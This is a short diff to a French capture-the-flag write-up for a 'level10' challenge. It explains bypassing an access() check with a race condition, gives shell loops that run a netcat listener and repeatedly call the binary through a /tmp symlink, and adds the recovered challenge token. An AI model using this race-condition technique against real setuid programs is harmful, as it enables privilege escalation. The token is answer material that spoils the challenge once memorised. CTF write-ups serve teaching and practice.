@@ -6,3 +6,5 @@ En regardant dans le binaire on voit que la fonction access est appelé et en se
 En se renseignant un peu on voit qu'on pet bypass access avec une race condition, on fait donc un .c puis on execute :
 while true; do nc -lv 127.0.0.1 6969;done
 et while true; do ./level10 /tmp/prt/link 127.0.0.1; done
+
+token: woupa2yuojeeaaed06riuj63c
